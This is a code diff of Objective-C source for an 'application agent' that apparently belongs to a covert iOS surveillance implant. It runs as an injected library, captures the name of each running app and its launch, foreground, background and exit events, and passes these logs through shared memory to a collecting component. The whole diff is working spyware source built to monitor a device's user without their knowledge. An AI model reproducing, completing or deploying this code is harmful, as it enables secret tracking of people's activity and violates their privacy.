@@ -19,88 +19,7 @@
 
 //#define DEBUG
 
-static RCSIAgentApplication *sharedAgentApplication = nil;
-extern RCSISharedMemory     *mSharedMemoryLogging;
-
-
-@implementation RCSIAgentApplication
-
-@synthesize isAppStarted;
-
-#pragma mark -
-#pragma mark Class and init methods
-#pragma mark -
-
-+ (RCSIAgentApplication *)sharedInstance
-{
-  @synchronized(self)
-  {
-  if (sharedAgentApplication == nil)
-    {
-      //
-      // Assignment is not done here
-      [[self alloc] init];
-    }
-  }
-  
-  return sharedAgentApplication;
-}
-
-+ (id)allocWithZone: (NSZone *)aZone
-{
-  @synchronized(self)
-  {
-  if (sharedAgentApplication == nil)
-    {
-      sharedAgentApplication = [super allocWithZone: aZone];
-      
-      // Assignment and return on first allocation
-      return sharedAgentApplication;
-    }
-  }
-  
-  // On subsequent allocation attemps return nil
-  return nil;
-}
-
-- (id)copyWithZone: (NSZone *)aZone
-{
-  return self;
-}
-
-- (id)retain
-{
-  return self;
-}
-
-- (unsigned)retainCount
-{
-  // Denotes an object that cannot be released
-  return UINT_MAX;
-}
-
-- (void)release
-{
-  // Do nothing
-}
-
-- (id)autorelease
-{
-  return self;
-}
-
-- (id)init
-{
-  self = [super init];
-  
-  if (self != nil)
-      isAppStarted = NO;
-    
-  return self;
-}
-#pragma mark -
-#pragma mark Agent Formal Protocol Methods
-#pragma mark -
+@implementation agentApplication
 
 - (BOOL)writeProcessInfoWithStatus: (NSString*)aStatus
 {
@@ -151,7 +70,7 @@ extern RCSISharedMemory     *mSharedMemoryLogging;
   unsigned int del = LOG_DELIMITER;
   [entryData appendBytes: &del
                   length: sizeof(del)];
-
+  
   gettimeofday(&tp, NULL);
   
   // Log buffer
@@ -168,45 +87,23 @@ extern RCSISharedMemory     *mSharedMemoryLogging;
          [entryData bytes],
          [entryData length]);
   
-  if ([mSharedMemoryLogging writeMemory: logData 
-                                 offset: 0
-                          fromComponent: COMP_AGENT] == TRUE)
-    {
-#ifdef DEBUG
-      NSLog(@"[DYLIB] %s: Application sent through SHM", __FUNCTION__);
-#endif
-    }
-  else
-    {
-#ifdef DEBUG
-      NSLog(@"[DYLIB] %s: Error while logging Application to shared memory", __FUNCTION__);
-#endif
-    }
-
+  [[RCSISharedMemory sharedInstance] writeIpcBlob:logData];  
+  
   [logData release];
   [entryData release];
-
+  
   return YES;
 }
 
 - (BOOL)grabInfo: (NSString*)aStatus
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-#ifdef DEBUG
-  NSLog(@"[DYLIB] %s: running app agent status %@", __FUNCTION__, aStatus);
-#endif
   NSBundle *bundle = [NSBundle mainBundle];
   
   NSDictionary *info = [bundle infoDictionary];
   
   mProcessName = (NSString*)[[info objectForKey: (NSString*)kCFBundleExecutableKey] copy];
   mProcessDesc = @"";
-  
-#ifdef DEBUG
-  if (mProcessName != nil) 
-    NSLog(@"[DYLIB] %s: application agent info %@", __FUNCTION__, mProcessName);
-#endif
   
   [self writeProcessInfoWithStatus: aStatus];
   
@@ -227,81 +124,76 @@ extern RCSISharedMemory     *mSharedMemoryLogging;
     [self grabInfo: PROC_STOP];
 }
 
-- (void)start
+- (void)agentRunLoop
 {
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-#ifdef DEBUG
-  NSLog(@"[DYLIB] %s: Agent Application started", __FUNCTION__);
-#endif
-  
-  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
-  
-  // Ok application is running
-  [self grabInfo: PROC_START];
-  
-  // For iOS4:
-  // wait for termination and write down the log      
-  [[NSNotificationCenter defaultCenter] addObserver: self
-                                           selector: @selector(sendStartLog)
-                                               name: @"UIApplicationWillEnterForegroundNotification"
-                                             object: nil];
-  
-  [[NSNotificationCenter defaultCenter] addObserver: self
-                                           selector: @selector(sendStopLog)
-                                               name: @"UIApplicationDidEnterBackgroundNotification"
-                                             object: nil];
-  
-  // for iOS 3.x: create "STOP" log on exit event
-  [[NSNotificationCenter defaultCenter] addObserver: self
-                                           selector: @selector(sendStopLog)
-                                               name: @"UIApplicationWillTerminateNotification"
-                                             object: nil];
-  
-  sleep(1);
-  
-  isAppStarted = YES;
-  
-  [outerPool release];
-}
-
-- (BOOL)stop
-{
-  // stop writing down STOP log
-  [[NSNotificationCenter defaultCenter] removeObserver:self];
-
-#ifdef DEBUG
-  NSLog(@"[DYLIB] %s: stopping Application Agent", __FUNCTION__);
-#endif
-  
-  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
-  
-  isAppStarted = NO;
-  
-  return YES;
-}
-
-- (BOOL)resume
-{
-  return YES;
-}
-
-#pragma mark -
-#pragma mark Getter/Setter
-#pragma mark -
-
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
-{
-  if (aConfiguration != mAgentConfiguration)
-    {
-      [mAgentConfiguration release];
-      mAgentConfiguration = [aConfiguration retain];
+  while (mAgentStatus == AGENT_STATUS_RUNNING) 
+    { 
+      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
+      [pool release];
     }
 }
 
-- (NSMutableDictionary *)mAgentConfiguration
+- (id)init
 {
-  return mAgentConfiguration;
+  self = [super init];
+  
+  if (self != nil)
+    mAgentID = AGENT_APPLICATION;
+  
+  return self;
+}
+
+- (BOOL)start
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+
+  if ([self mAgentStatus] == AGENT_STATUS_STOPPED )
+    {
+      [self setMAgentStatus: AGENT_STATUS_RUNNING];
+    
+      [self grabInfo: PROC_START];
+          
+      [[NSNotificationCenter defaultCenter] addObserver: self
+                                               selector: @selector(sendStartLog)
+                                                   name: @"UIApplicationWillEnterForegroundNotification"
+                                                 object: nil];
+
+      NSString *majVer = [[[UIDevice currentDevice] systemVersion] substringToIndex:1];
+    
+      if ([majVer compare: @"3"] == NSOrderedSame)
+        {
+          [[NSNotificationCenter defaultCenter] addObserver: self
+                                                   selector: @selector(sendStopLog)
+                                                       name: @"UIApplicationWillTerminateNotification"
+                                                     object: nil];
+        }
+      else
+        {  
+          [[NSNotificationCenter defaultCenter] addObserver: self
+                                                   selector: @selector(sendStopLog)
+                                                       name: @"UIApplicationDidEnterBackgroundNotification"
+                                                     object: nil];
+        }
+      
+      sleep(1);
+      
+      isAppStarted = YES;
+    }
+  
+  [outerPool release];
+  
+  return YES;
+}
+
+- (void)stop
+{
+  [[NSNotificationCenter defaultCenter] removeObserver:self];
+  
+  [self setMAgentStatus: AGENT_STATUS_STOPPED];
+  
+  isAppStarted = NO;
 }
 
 @end
+
